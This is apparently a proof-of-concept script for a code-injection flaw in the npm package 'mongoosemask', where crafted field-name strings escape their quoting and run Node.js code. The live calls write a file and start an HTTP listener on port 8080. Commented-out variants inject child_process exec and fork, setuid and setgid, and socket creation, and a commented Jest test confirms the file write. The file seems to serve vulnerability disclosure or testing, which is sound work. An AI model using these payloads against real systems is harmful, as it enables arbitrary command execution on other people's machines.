const mask = require("mongoosemask");
mask.mask({}, [
  'id"]; require(`fs`)["writeFileSync"](`mongoosemask`,``)//',
]);

// test("Arbitrary code execution in mongoosemask", () => {
//   expect.assertions(2);
//   const fs = require("fs");
//   const mask = require("mongoosemask");
//   const path = "./mongoosemask";
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   try {
//     mask.mask({}, [
//       'id"]; require(`fs`)["writeFileSync"](`mongoosemask`,``)//',
//     ]);
//   } catch (error) {}
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(true);
//   fs.unlink(path, function (err) {});
// });

// mask.mask({}, [
//   'id"]; require(`child_process`)["exec"](`ls ./`)//',
// ]);

// mask.mask({}, [
//   'id"]; require(`child_process`)["fork"](`test1.js`)//',
// ]);

// mask.mask({}, [
//   'id"]; process["setgid"](123)//',
// ]);

// mask.mask({}, [
//   'id"]; process["setuid"](123)//',
// ]);

// mask.mask({}, [
//   'id"]; require(`net`)["connect"]({port: 8080}, function() {})//',
// ]);

// mask.mask({}, [
//     'id"]; require(`dgram`)["createSocket"]({ type: "udp4" })["bind"](8080)//',
//   ]);

mask.mask({}, [
    'id"]; require(`http`)["createServer"](function(){})["listen"](8080)//',
  ]);